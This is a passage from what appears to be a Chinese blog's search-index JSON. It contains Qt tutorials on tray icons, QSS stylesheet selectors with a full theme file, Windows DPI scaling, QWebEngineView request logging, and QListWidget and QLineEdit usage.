img(&quot;:/Win11.jpg&quot;); ui-&gt;label-&gt;setPixmap(img); ui-&gt;label-&gt;setScaledContents(true); ui-&gt;label-&gt;setToolTip(QString(&quot;壁纸《Win11.png》&quot;)); ui-&gt;pushButton-&gt;setToolTip(QString(&quot;隐藏或显示图片&quot;)); QIcon icon = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)0); QIcon icon1 = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)9); //设置通知栏的图标 trayIcon = new QSystemTrayIcon(this); trayIcon-&gt;setIcon(icon); //设置通知栏的单击事件 connect(trayIcon, SIGNAL(activated(QSystemTrayIcon::ActivationReason)), this, SLOT(stTrayIconActive(QSystemTrayIcon::ActivationReason))); //设置通知栏的右键菜单 QMenu * menu = new QMenu(); //设置菜单项目 QAction *actionHide = new QAction(icon, &quot;Hide&quot;, menu); menu-&gt;addAction(actionHide); trayIcon-&gt;setContextMenu(menu); // 设置Action的响应 connect(actionHide, SIGNAL(triggered()), this, SLOT(stActionHide())); trayIcon-&gt;show(); //托盘的消息提示 trayIcon-&gt;showMessage(&quot;title&quot;, &quot;this is a message&quot;, icon1);&#125;Widget::~Widget()&#123; delete ui;&#125;void Widget::stTrayIconActive(QSystemTrayIcon::ActivationReason acReason)&#123; switch (acReason) &#123; case QSystemTrayIcon::Trigger: &#123; showNormal(); break; &#125; default: ; &#125;&#125;void Widget::on_pushButton_clicked()&#123; QIcon icon = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)0); QIcon icon1 = QApplication::style()-&gt;standardIcon((QStyle::StandardPixmap)9); if(ui-&gt;label-&gt;isVisible()) &#123; trayIcon-&gt;showMessage(&quot;提醒&quot;, &quot;隐藏图片&quot;, icon1); ui-&gt;label-&gt;hide(); &#125; else &#123; trayIcon-&gt;showMessage(&quot;提醒&quot;, &quot;显示图片&quot;, icon1); ui-&gt;label-&gt;setVisible(true); &#125;&#125; widget.ui","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"通知","slug":"通知","permalink":"http://example.com/tags/%E9%80%9A%E7%9F%A5/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"【一文搞懂】qss","date":"2023-10-27T01:24:02.236Z","path":"B_Code/Qt/Qss/","text":"QssQss的写法参考css即可。 网站推荐： Qt Style Sheets Reference | Qt 4.8 书籍推荐： 《Qt样式葵花宝典》提取码：nod5 工具推荐： Qss Editor 0.6.1 提取码：yzbi Qss Stylesheet Editor 1.7 提取码：4r3i Qss加载的常规操作 在资源文件夹中添加style.qss的文件 以文件IO的方式读取并设置即可。 读取的代码： 1234567891011121314151617181920void Widget::InitStyle(int i)&#123; m_LCD_Hour-&gt;setStyleSheet(&quot; font: 18px black;&quot;); if(i != 0) &#123; QFile file(QString(&quot;:/Assert/qss/style%1.qss&quot;).arg(i)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close(); return; &#125; // m_LCD_Min-&gt;setStyleSheet(&quot;color: black; &quot;); // m_LCD_Sec-&gt;setStyleSheet(&quot;color: black; &quot;); QFile file(QString(&quot;:/Assert/qss/main.qss&quot;)); file.open(QFile::ReadOnly); this-&gt;setStyleSheet(file.readAll()); file.close();&#125; 感兴趣的朋友可以看看我整理的一些Qt小项目常用的一些代码：[【Qt】常用基础代码汇总（随时更新）_欧恩意的博客-CSDN博客_qt代码整理]https://blog.csdn.net/Fuel_Ming/article/details/122830341) 选择器一般情况下，在ui文件中的控件有效，而在代码中声明的则无效，因为Qt是根据objectName来识别的，所以自己声明的控件需要设置对象名。 1m_btn-&gt;setObjectName(&quot;BtnOK&quot;); 在QSS文件中： 1234567QPushButton#BtnOK&#123; color:white; background-color:rgb(0,112,210);&#125;QPushButton#BtnOK::hover&#123; background-color: rgb(0,134,252);&#125; 通用选择器即 * 表示的css对象。作用于所有的界面控件 123* &#123; color: red;&#125; 类型选择器 作用于自己及子类 类名（Qt类）作为选择器，作用于其自身和他所有的子类 123QFrame &#123; background: gray;&#125; 使用了类型选择器 QFrame，所以 QFrame 和它的子类 QLable，QLCDNumber，QTableWidget 等的背景会是灰色的，QPushButton 不是 QFrame 的子类，所以不受影响。在Qt的类图或者帮助手册中可以看到一个Qt类的子类和父类。 只作用于自己 即 . + 类名 的形式。作用对象只有它自己。子类不受影响。 1234QWidget *window = new QWidget();window-&gt;setStylesheet(&quot;.QWidget &#123; &quot; &quot;color:red;&quot; &quot;&#125;&quot;); ID选择器# + objectname作为选择器。只作用于此 objectname 的对象（多个对象可以设置同一个 objectname，但不推荐这么写）。 1234567891011121314QPushButton *btn = new QPushButton;// 设置属性名btn-&gt;setObjectName(&quot;openButton&quot;);// 设置样式// 1btn-&gt;setStylesheet(&quot;#openButton &#123; &quot; &quot;color:red;&quot; &quot;&#125;&quot;);// 2btn-&gt;setStylesheet(&quot;QPushButton#openButton &#123; &quot; &quot;color:red;&quot; &quot;&#125;&quot;); 属性选择器[属性 = 值]的形式设置样式。需要通过object-&gt;property()接口设置Qt控件的属性值（Dynamic Properties）。 12345app.setStyleSheet(&quot;.QWidget &#123; background: gray; &#125;&quot; &quot;QPushButton[level=\\&quot;dangerous\\&quot;] &#123; background: magenta; &#125;&quot;); openButton-&gt;setProperty(&quot;level&quot;, &quot;dangerous&quot;);closeButton-&gt;setProperty(&quot;level&quot;, &quot;dangerous&quot;); 包含选择器也就是对控件内的控件的类进行设置，一看就懂，选择器之间用空格隔开，包含选择器和子元素选择器需要区分： 12345678910QFrame &#123; background: gray;&#125; QFrame QPushButton &#123; border: 2px solid magenta; border-radius: 10px; background: white; padding: 2px 15px;&#125; 子元素选择器选择器之间用 &gt; 隔开，作用于Widget的 直接 子Widget 12345678910QFrame &#123; background: gray;&#125; QFrame &gt; QPushButton &#123; border: 2px solid magenta; border-radius: 10px; background: white; padding: 2px 15px;&#125; 伪类选择器选择器:状态 作为选择器。支持!操作。 123QPushButton:hover &#123; color: white &#125;QCheckBox:checked &#123; color: white &#125;QCheckBox:!checked &#123; color: red &#125; 常见的伪类选择器如下所示： 伪类 说明 :disabled Widget 被禁用时 :enabled Widget 可使用时 :focus Widget 得到输入焦点 :hover 鼠标放到 Widget 上 :pressed 鼠标按下时 :checked 被选中时 :unchecked 未选中时 :has-children Item 有子 item，例如 QTreeView 的 item 有子 item 时 :has-siblings Item 有 兄弟，例如 QTreeView 的 item 有兄弟 item 时 :open 打开或展开状态，例如 QTreeView 的 item 展开，QPushButton 的菜单弹出时 :closed 关闭或者非展开状态 :on Widget 状态是可切换的（toggle）, 在 on 状态 :off Widget 状态是可切换的（toggle）, 在 off 状态 SubControl选择器选择器::subcontrol 作为选择 Subcontrol 的选择器。 有些 Widget 是由多个部分组合成的，例如 QCheckBox 由 icon(indicator) 和 text 组成，可以使用 选择器::subcontrol 来设置 subcontrol 的样式： 12345678QCheckBox::indicator &#123; width: 20px; height: 20px;&#125;QCheckBox &#123; spacing: 8px;&#125; 常用的 Subcontrol 有： Subcontrol 说明 ::indicator A QCheckBox, QRadioButton, checkable QMenu item, or a checkable QGroupBox’s indicator ::menu-indicator A QPushButton’s menu indicator ::item A QMenu, QMenuBar, or QStatusBar’s item ::up-button A QSpinBox or QScrollBar’s up button ::down-button A QSpinBox or QScrollBar’s down button ::up-arrow A QSpinBox, QScrollBar, or QHeaderView’s up arrow ::down-arrow A QSpinBox, QScrollBar, or QHeaderView’s down arrow ::drop-down A QComboBox’s drop-down arrow ::title A QGroupBox or QDockWidget’s title ::groove A QSlider’s groove ::chunk A QProgressBar’s progress chunk ::branch A QTreeView’s branch indicator 补充一些其他写法的参考demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448/* ================================================ *author:leilastedited:2020.2* ================================================ */$text = #222;$background = #FDFDFD;$border = #999999;$selected = #8BF; /*hover*/$pressed = #59F;$focused = #EA2; /*actived*/$grad1a = #EEEEEF; /*gradient start*/$grad1b = #DADADF; /*gradient end*/QWidget&#123; color: $text; background-color: $background;&#125;QFrame&#123; color: $text; background-color: $background;/*不能设置为transparent*/&#125;QMainWindow::separator&#123; border: 1px solid $border; border-style: outset; width: 4px; height: 4px;&#125;QMainWindow::separator:hover&#123; background: $selected;&#125;QSplitter::handle&#123; border: 1px solid $border; border-style: outset; width: 4px; height: 4px;&#125;QSplitter::handle:hover&#123;/*splitter-&gt;handle(1)-&gt;setAttribute(Qt::WA_Hover, true);才生效*/ border-color: $focused;&#125;QSplitter::handle:pressed&#123; border-color: $pressed;&#125;QSizeGrip&#123; background-color: none;&#125;/* =============================================== *//* Label *//* =============================================== */QLabel &#123; background: transparent; border: 1px solid transparent; padding: 1px;&#125;/* A QLabel is a QFrame ... *//* A QToolTip is a QLabel ... */QToolTip &#123; border: 1px solid $border; padding: 5px; border-radius: 3px; opacity:210;&#125;/* =============================================== *//* TextBox *//* =============================================== */QLineEdit &#123; background: $background;/*不建议设为透明，否则table编辑时会字显示*/ selection-background-color: $selected; border: 1px solid $border; border-radius: 2px; border-style: inset; padding: 0 1px;&#125;QLineEdit:hover&#123; border-color: $selected;&#125;QLineEdit:focus&#123; border-color: $focused;&#125;/*QLineEdit[readOnly=&quot;true&quot;] &#123; color: gray &#125;*/QLineEdit[echoMode=&quot;2&quot;]&#123; lineedit-password-character: 9679;/*字符的ascii码35 88等 */&#125;QLineEdit:read-only &#123; color: lightgray;&#125;QLineEdit:disabled&#123; color: lightgray; background: lightgray;&#125;QTextEdit&#123; selection-background-color:$selected; border: 1px solid $border; border-style: inset;&#125;QTextEdit:hover&#123; border-color: $selected;&#125;QTextEdit:focus&#123; border-color: $focused;&#125;/* =============================================== *//* Button *//* =============================================== */QPushButton &#123; border: 1px solid $border; border-radius: 2px; /*background-color: QLinearGradient( x1: 0, y1: 0, x2: 0, y2: 1, stop: 0 $grad1a, stop: 0.05 $grad1b,stop: 0.5 $grad1b, stop: 0.9 $grad1a, stop: 1 $grad1a);*/ padding: 1px 4px; min-width: 50px; min-height: 16px;&#125;QPushButton:hover&#123; background-color: $selected; border-color: $pressed;&#125;QPushButton:pressed&#123; border-width: 1px; background-color: $pressed; border-color: $border;&#125;QPushButton:focus, QPushButton:default &#123; border-color: $focused; /* make the default button prominent */&#125;QToolButton,QToolButton:unchecked &#123; /* ToolBar里的按钮和带下拉菜单的按钮 */ border: 1px solid transparent; border-radius: 3px; background-color: transparent; margin: 1px;&#125;QToolButton:checked&#123; background-color: $selected; border-color: $pressed;&#125;QToolButton:hover&#123; background-color: $selected; border-color: $pressed;&#125;QToolButton:pressed,QToolButton:checked:hover&#123; background-color: $pressed; border-color: $focused;&#125;QToolButton:checked:pressed&#123; background-color: $selected;&#125;/* only for MenuButtonPopup */QToolButton[popupMode=&quot;1&quot;]&#123; padding-left: 1px; padding-right: 15px; /* make way for the popup button */ border: 1px solid $border; min-height: 15px; /*background: qlineargradient(x1:0, y1:0 ,x2:0, y2:1 stop: 0 $grad1a, stop: 0.05 $grad1b, stop: 0.5 $grad1b stop: 0.95 $grad1a stop: 1$grad1a)*/&#125;QToolButton[popupMode=&quot;1&quot;]:hover&#123; background-color: $selected; border-color: $pressed;&#125;QToolButton[popupMode=&quot;1&quot;]:pressed&#123; border-width: 1px; background-color: $pressed; border-color: $border;&#125;QToolButton::menu-button &#123; border: 1px solid $border; border-top-right-radius: 2px; border-bottom-right-radius: 2px; width: 16px;&#125;/* =============================================== *//* Slider ProgressBar *//* =============================================== */QProgressBar &#123; border: 1px solid $border; border-radius: 4px; text-align: center;&#125;QProgressBar::chunk &#123; background-color: $focused; width: 4px; margin: 1px;&#125;QSlider&#123; border: 1px solid transparent;&#125;QSlider::groove&#123; border: 1px solid $border; background: $background;&#125;QSlider::handle &#123;/*设置中间的那个滑动的键*/ border: 1px solid $border; background: $selected;&#125;QSlider::groove:horizontal &#123; height: 3px; /* the groove expands to the size of the slider by default. by giving it a height, it has a fixed size */ left:5px; right: 5px;&#125;QSlider::groove:vertical&#123; width: 3px; top: 5px; bottom: 5px;&#125;QSlider::handle:horizontal&#123; width: 6px; margin: -7px; /* height */&#125;QSlider::handle:vertical&#123; height: 6px; margin: -7px; /* height */&#125;QSlider::add-page&#123;/*还没有滑上去的地方*/ border: 1px solid $border; background:$grad1a;&#125;QSlider::sub-page&#123;/*已经划过的从地方*/ background: $focused;&#125;/* =============================================== *//* ScrollBar *//* =============================================== */QScrollBar&#123; background-color: $background; border: 1px solid $border; border-radius: 5px; padding: 1px; height: 10px; width: 10px;&#125;QScrollBar:hover&#123; border-color:$selected;&#125;QScrollBar::handle&#123; border-radius: 3px; background: $pressed; min-width: 16px; min-height: 16px;&#125;QScrollBar::handle:hover &#123; background: $focused;&#125;QScrollBar::add-line, QScrollBar::sub-line,QScrollBar::add-page, QScrollBar::sub-page &#123; width: 0px; background: transparent;&#125;QScrollArea&#123; border: none;&#125;/*QScrollArea QAbstractSlider&#123; border-radius: 0px;&#125;*//* =============================================== *//* DockWidget *//* =============================================== */QDockWidget, QDockWidget &gt; QWidget/*not work*/&#123; border-color: $border;/*qt bug*/ background: transparent;&#125;QDockWidget::title &#123; border-bottom: 1px solid $border; border-style: inset; text-align: left; /* align the text to the left */ padding: 6px;&#125;/* =============================================== *//* GroupBox *//* =============================================== */QGroupBox &#123; background-color: $background; border: 1px solid $border; border-radius: 4px; margin-top: 0.5em;&#125;QGroupBox::title &#123; subcontrol-origin: margin; subcontrol-position: top left; left: 1em; top: 0.1em; background-color: $background;&#125;/* =============================================== *//* ToolBox *//* =============================================== */QToolBox&#123; border: 1px solid $border;&#125;QToolBox::tab &#123; background: $grad1a; border: 1px solid $border; border-radius: 1px;&#125;QToolBox::tab:hover &#123; background-color: $selected; border-color: transparent;&#125;QToolBox::tab:pressed &#123; background-color: $pressed; border-color: transparent;&#125;QToolBox::tab:selected &#123; font-weight: bold; border-color: $selected;&#125;/* =============================================== *//* TabWidget *//* =============================================== */QTabWidget&#123; margin-top:10px;&#125;QTabWidget::pane&#123; border: 1px solid $border;&#125;QTabWidget::tab-bar &#123; left: 0px;&#125;QTabBar::tab &#123; background: $background; border: 1px solid $border; padding: 3px 5px; &#125;QTabBar::tab:hover &#123; background: $selected; border-color: transparent;&#125;QTabBar::tab:selected &#123; background: $selected; border-color: $pressed;&#125;QTabBar::tab:pressed &#123; background: $pressed; border-color: transparent;&#125;QTabBar::tab:focus &#123; border-color: $focused;&#125;QTabBar::tab:top&#123; margin-top: 3px; border-bottom: transparent; margin-right: 1px;&#125;QTabBar::tab:bottom&#123; margin-bottom: 3px; border-top: transparent; margin-right: 1px;&#125;QTabBar::tab:left&#123; border-right: transparent; margin-bottom: 1px;&#125;QTabBar::tab:right&#123; border-left: transparent; margin-bottom: 1px;&#125;/* =============================================== *//* QHeaderView for list table *//* =============================================== */QHeaderView &#123; border: none; margin: 0px; padding: 0px;&#125;QHeaderView::section, QTableCornerButton::section &#123;/*设置表头属性*//*左上角*/ background-color: $grad1a; padding: 0 3px; border-right: 1px solid $border; border-bottom: 1px solid $border; border-radius: 0px;&#125;QHeaderView::section:hover, QTableCornerButton::section:hover&#123; background-color: $selected;&#125;QHeaderView::section:pressed&#123; background-color: $pressed;&#125;QHeaderView::section:checked &#123; background-color: $focused;&#125;/* =============================================== *//* QTableWidget *//* =============================================== */QTableWidget, QTableView&#123; gridline-color: $border; /*表格中的网格线条颜色*/ background: $background; /*设置交替颜色，需要在函数属性中设置:tableWidget-&gt;setAlternatingRowColors(true)*/ alternate-background-color: $grad1a; /*selection-color:$background; 鼠标选中时前景色：文字颜色*/ selection-background-color:$selected; /*鼠标选中时背景色*/ border:1px solid $border; /*边框线的宽度、颜色*/ /*border:none; 去除边界线*/ /*border-radius:5px;*/ /*padding:10px 10px;*/ /*表格与边框的间距*/&#125;QTableView::item, QTabWidget::item&#123; background: transparent; outline-style: none; border: none;&#125;QTableView::item:hover &#123; background: $selected; border: 1px solid $focused;&#125;QTableView::item:selected &#123; background: $selected; color: $grad1a;&#125;QTableView::item:selected:active &#123; background: $pressed; color: $grad1a;&#125;QTableWidget QComboBox&#123; margin: 2px; border: none;&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"css","slug":"css","permalink":"http://example.com/tags/css/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt窗口适配系统缩放","date":"2023-10-27T01:24:02.235Z","path":"B_Code/Qt/QWin/Qt窗口适配系统缩放/","text":"代码1234567891011121314151617181920212223struct DpiCompatible&#123; static double GetDpiScale() &#123; double dDpi = 1.0; HDC desktopDc = GetDC(NULL); float horizontalDPI = GetDeviceCaps(desktopDc, LOGPIXELSX); float verticalDPI = GetDeviceCaps(desktopDc, LOGPIXELSY); int dpi = (horizontalDPI + verticalDPI) / 2; dDpi = 1 + ((dpi - 96) / 24) * 0.25; if (dDpi &lt; 1) &#123; dDpi = 1; &#125; ReleaseDC(NULL, desktopDc); return dDpi; &#125; static void InitQtDPICompatible() &#123; SetProcessDPIAware(); qputenv(&quot;QT_SCALE_FACTOR&quot;, QString::number(GetDpiScale()).toLatin1()); &#125;&#125;; 使用12//设置该属性解决在不同缩放比例的显示器之间移动时布局混乱和不跟随windows系统缩放的问题DpiCompatible::InitQtDPICompatible();","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"缩放","slug":"缩放","permalink":"http://example.com/tags/%E7%BC%A9%E6%94%BE/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"QWin","slug":"B-Code/Qt/QWin","permalink":"http://example.com/categories/B-Code/Qt/QWin/"}]},{"title":"使用 QWebEngineView 加载网页慢的问题","date":"2023-10-27T01:24:02.233Z","path":"B_Code/Qt/QWebEngineView/网页加载慢/","text":"[toc] 定位把 QWebEngineview 发起的每个网络请求全部打印，看看是哪个请求慢： 重写 QWebEngineUrlRequestInterceptor123456789101112131415161718192021class CustomUrlRequestInterceptor : public QWebEngineUrlRequestInterceptor&#123;public: CustomUrlRequestInterceptor(QObject* parent = nullptr) : QWebEngineUrlRequestInterceptor(parent) &#123;&#125; void interceptRequest(QWebEngineUrlRequestInfo&amp; info) override &#123; // 可在发送请求前对URL进行修改 if (info.requestUrl().host() == &quot;www.example.com&quot;) &#123; QUrl newUrl = info.requestUrl(); newUrl.setHost(&quot;www.newexample.com&quot;); info.setUrl(newUrl); &#125; // 可添加自定义Header info.setHttpHeader(&quot;User-Agent&quot;, &quot;Custom User-Agent&quot;); // 打印日志 LogUtils::info(info.requestUrl().toString().toStdString().c_str());//输出日志 &#125;&#125;; 关闭系统代理设置关闭系统自动代理即可： 1QNetworkProxyFactory::setUseSystemConfiguration(false);","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"QWebEngineView","slug":"QWebEngineView","permalink":"http://example.com/tags/QWebEngineView/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"QWebEngineView","slug":"B-Code/Qt/QWebEngineView","permalink":"http://example.com/categories/B-Code/Qt/QWebEngineView/"}]},{"title":"窗体不显示或半透明","date":"2023-10-27T01:24:02.232Z","path":"B_Code/Qt/QWebEngineView/窗体不显示或窗体半透明/","text":"使用 QWebEnginueView 控件后，如果父窗体设置了一下属性，就会导致窗口不显示或半透明。 12setWindowFlags(Qt::FramelessWindowHint);setAttribute(Qt::WA_TranslucentBackground); 解决办法： QWebEngineView在顶层窗口为透明无标题栏的情况下有问题_shanql的博客-CSDN博客","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"QWebEngineView","slug":"QWebEngineView","permalink":"http://example.com/tags/QWebEngineView/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"QWebEngineView","slug":"B-Code/Qt/QWebEngineView","permalink":"http://example.com/categories/B-Code/Qt/QWebEngineView/"}]},{"title":"QTableWidget 遍历","date":"2023-10-27T01:24:02.231Z","path":"B_Code/Qt/QTableWidget/QTableWidget遍历/","text":"123456789101112for(int row=0; row&lt;ui-&gt;tableWidget-&gt;rowCount(); row++)&#123; for(int col=0; col&lt;ui-&gt;tableWidget-&gt;columnCount(); col++) &#123; QTableWidgetItem* item = ui-&gt;tableWidget_right-&gt;item(row,col); &#125;&#125;for(int row=0; row&lt;ui-&gt;tableWidget-&gt;rowCount(); row++)&#123; QTableWidgetItem* item = ui-&gt;tableWidget_right-&gt;item(row,0);&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"QTableWidget","slug":"QTableWidget","permalink":"http://example.com/tags/QTableWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"QTableWidget","slug":"B-Code/Qt/QTableWidget","permalink":"http://example.com/categories/B-Code/Qt/QTableWidget/"}]},{"title":"QListWidget 用法整理","date":"2023-10-27T01:24:02.229Z","path":"B_Code/Qt/QListWidget 用法整理/","text":"设置显示模式12QListView::ListModeQListView::IconMode 调用接口： 1setViewMode(QListWidget::IconMode); //显示模式 添加控件效果 新建项目的时候创建一个带ui的项目，新建完成后，在界面拖拽一个QListWidget。 Widget.h1234567891011121314151617181920212223242526272829303132333435#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include &lt;QListWidget&gt;#include &lt;QStringList&gt;#include &lt;QString&gt;#include &lt;QDebug&gt;#include &lt;QListWidgetItem&gt;#include &lt;QGridLayout&gt;#include &lt;QToolButton&gt;#include &lt;QLineEdit&gt;#include &lt;QRadioButton&gt;QT_BEGIN_NAMESPACEnamespace Ui &#123; class Widget; &#125;QT_END_NAMESPACEclass Widget : public QWidget&#123; Q_OBJECTpublic: Widget(QWidget *parent = nullptr); ~Widget();private: void initListWidget();private: Ui::Widget *ui;&#125;;#endif // WIDGET_H Widget.cpp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); initListWidget();&#125;Widget::~Widget()&#123; delete ui;&#125;void Widget::initListWidget()&#123; ui-&gt;listWidget-&gt;setCurrentRow(2); QStringList StrListHeader; StrListHeader &lt;&lt; QString(&quot;选中&quot;) &lt;&lt; QString(&quot;序号&quot;) &lt;&lt; QString(&quot;文件名&quot;); new QListWidgetItem(tr(&quot;Oak&quot;), ui-&gt;listWidget); new QListWidgetItem(tr(&quot;Fir&quot;), ui-&gt;listWidget); new QListWidgetItem(tr(&quot;Pine&quot;), ui-&gt;listWidget); QListWidgetItem *ListItem = new QListWidgetItem; // ListItem-&gt;setText(); QListWidgetItem *WContainerItem = new QListWidgetItem(ui-&gt;listWidget); QWidget *WContainer = new QWidget(ui-&gt;listWidget);//新建一个QWidget窗口 QGridLayout*Glayout = new QGridLayout;/*************start*****************//* 在这里添加需要的控件 */ QLineEdit *lineEdit = new QLineEdit; QLineEdit *lineEdit_1 = new QLineEdit; QToolButton *toolButton = new QToolButton; QRadioButton *radioButton = new QRadioButton; QRadioButton *radioButton_1 = new QRadioButton; Glayout-&gt;addWidget(lineEdit,0,0); Glayout-&gt;addWidget(radioButton,0,1); Glayout-&gt;addWidget(lineEdit_1,0,2); Glayout-&gt;addWidget(radioButton_1,0,3); WContainer-&gt;setLayout(Glayout);/******************end****************/ WContainerItem-&gt;setSizeHint(QSize(40,40)); ui-&gt;listWidget-&gt;setItemWidget(WContainerItem, WContainer);//将WContainer赋予WContainerItem&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"QListWidget","slug":"QListWidget","permalink":"http://example.com/tags/QListWidget/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"QLineEdit 修改部分文本样式","date":"2023-10-27T01:24:02.227Z","path":"B_Code/Qt/QLineEdit/QLineEdit修改部分文本样式/","text":"功能描述： 修改QLineEdit中部分文本的样式 预期效果： windows系统路径不允许有？等符号，高亮显示不允许的符号。 [toc] 实现12345678910111213141516171819202122static void setLineEditTextFormat(QLineEdit* lineEdit, const QList&lt;QTextLayout::FormatRange&gt;&amp; formats)&#123; if(!lineEdit) return; QList&lt;QInputMethodEvent::Attribute&gt; attributes; foreach(const QTextLayout::FormatRange&amp; fr, formats) &#123; QInputMethodEvent::AttributeType type = QInputMethodEvent::TextFormat; int start = fr.start - lineEdit-&gt;cursorPosition(); int length = fr.length; QVariant value = fr.format; attributes.append(QInputMethodEvent::Attribute(type, start, length, value)); &#125; QInputMethodEvent event(QString(), attributes); QCoreApplication::sendEvent(lineEdit, &amp;event);&#125;static void clearLineEditTextFormat(QLineEdit* lineEdit)&#123; setLineEditTextFormat(lineEdit, QList&lt;QTextLayout::FormatRange&gt;());&#125; 示例1234567891011121314151617181920212223242526// Usage example:QLineEdit* lineEdit = new QLineEdit;lineEdit-&gt;setText(tr(&quot;Task Tracker - Entry&quot;));QList&lt;QTextLayout::FormatRange&gt; formats;QTextCharFormat f;f.setFontWeight(QFont::Bold);QTextLayout::FormatRange fr_task;fr_task.start = 0;fr_task.length = 4;fr_task.format = f;f.setFontItalic(true);f.setBackground(Qt::darkYellow);f.setForeground(Qt::white);QTextLayout::FormatRange fr_tracker;fr_tracker.start = 5;fr_tracker.length = 7;fr_tracker.format = f;formats.append(fr_task);formats.append(fr_tracker);setLineEditTextFormat(lineEdit, formats);","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"QLineEdit","slug":"B-Code/Qt/QLineEdit","permalink":"http://example.com/categories/B-Code/Qt/QLineEdit/"}]},{"title":"QLineEdit 修改密码模式及其样式","date":"2023-10-27T01:24:02.226Z","path":"B_Code/Qt/QLineEdit/QLineEdit 修改密码显示及其显示样式/","text":"[toc] Qt设置为密码模式参考 QLineEdit::setEchoMode。密码模式总共有两种 QLineEdit::Password QLineEdit::PasswordEchoOnEdit 修改样式QLineEdit 密码样式使用 Unicode 字符表示,密码样式修改在QLineEdit::Password 、QLineEdit::PasswordEchoOnEdit 有效Unicode 值查询网址： https://unicode-table.com/cn/search/ 1. 默认样式默认样式是实心圆点 ，Unicode值 9769 2. 自定义样式参考 Qt 助手 中的提升，搜索 Qt Style Sheets Examples 中关于 QLineEdit 的提示设置即可。 * 的 unicode 编码为 9679。 1234QLineEdit[echoMode=&quot;2&quot;] &#123; lineedit-password-character: 9679; &#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"QLineEdit","slug":"QLineEdit","permalink":"http://example.com/tags/QLineEdit/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"},{"name":"QLineEdit","slug":"B-Code/Qt/QLineEdit","permalink":"http://example.com/categories/B-Code/Qt/QLineEdit/"}]},{"title":"QAction Icon 大小问题","date":"2023-10-27T01:24:02.224Z","path":"B_Code/Qt/QAction Icon 大小/","text":"[toc] 问题描述 右键托盘弹出菜单，这个菜单是是通过 QMenu 实现的，通过添加 QAction 实现了几个子项。后续 UI 优化，提出需要修改 Icon的大小，设置 Icon 的大小为 24*24，遂进行了一番尝试，因影响颇多，暂且记录于此。 关于我这个右键托盘弹出选项框的肯定有别的方案，但是第一时间是想找一种比较简单的方案去实现，因此一直在搜索如何设置Icon大小的问题，目前看到的解决方案有以下几种： 通过设置 Style 实现 通过 QWidgetAction 实现 新建一个 Widget，实现 QMenu 的效果 1 通过设置 Style，修改icon size 新建样式类 123456789101112131415161718192021222324252627282930313233343536373839404142434445#pragma once#include &lt;QCommonStyle&gt;#include &lt;QStyleOption&gt;// 自定义一个style类，通过setStyle设置给menu，以此设置iconsizeclass QCustonIconStyle : public QCommonStyle&#123; Q_OBJECTpublic: QCustonIconStyle(int size) : 